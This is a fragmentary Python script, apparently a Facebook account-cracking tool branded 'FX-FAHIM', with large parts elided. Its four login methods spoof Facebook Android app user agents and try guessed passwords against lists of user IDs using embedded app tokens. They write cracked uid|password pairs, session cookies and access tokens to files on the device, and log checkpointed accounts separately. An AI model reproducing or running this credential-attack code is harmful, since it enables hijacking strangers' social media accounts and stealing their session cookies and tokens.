...
\033[1;32m==================================================
          ...
          Version    : 0.1
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         🍂  FX-FAHIM IS A BRAND 🥰          \x1b[0m
''')
	p(logo)
def clear():
	os.system("clear")
...
class FAHIM:
	...
	def FAHIM(self):
		...
		else:p(" [•] Wrong Select ");sp(2);self.FAHIM()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [FAHIM] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			...
			FAHIM_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBDV/SM-M546B;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'X-FB-Server-Cluster': 'True',}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[FAHIM-OK] %s | %s \033[1;97m '%(uid,pw))		
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
			#	   (f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
					open('/sdcard/FAHIM_OK.txt','a').write(uid+'|'+pw+'\n')					
					open('/sdcard/FAHIM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;35m[FAHIM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/FAHIM_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [FAHIM] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			...
			FAHIM_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBDV/RMX3357;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				...
				if "session_key" in q:
					...
					open('/sdcard/FAHIM_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/FAHIM_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[FAHIM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/FAHIM_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [FAHIM] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			...
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			FAHIM_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBDV/PESM10;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[FAHIM-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/FAHIM_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					#os.system('espeak -a 300 " FAHIM,  Ok,  id"')
					open('/sdcard/FAHIM_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;35m[FAHIM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/FAHIM_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [FAHIM] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/FAHIM_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/FAHIM_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[FAHIM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/FAHIM_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
